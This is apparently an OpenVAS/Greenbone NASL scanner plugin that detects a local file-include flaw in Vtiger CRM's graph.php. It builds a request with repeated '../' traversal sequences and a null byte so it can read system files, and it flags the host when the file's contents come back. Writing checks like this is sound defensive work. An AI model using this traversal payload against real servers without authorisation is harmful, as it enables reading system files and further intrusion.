CPE = "cpe:/a:vtiger:vtiger_crm";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103541" );
	script_bugtraq_id( 55078 );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Vtiger 'graph.php' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55078" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-08-18 12:55:37 +0200 (Sat, 18 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_vtiger_crm_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "vtiger/detected" );
	script_tag( name: "summary", value: "Vtiger is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view files and execute
local scripts in the context of the web server process. This may aid in further attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/graph.php?current_language=" + crap( data: "../", length: 9 * 6 ) + files[file] + "%00&module=Accounts&action";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

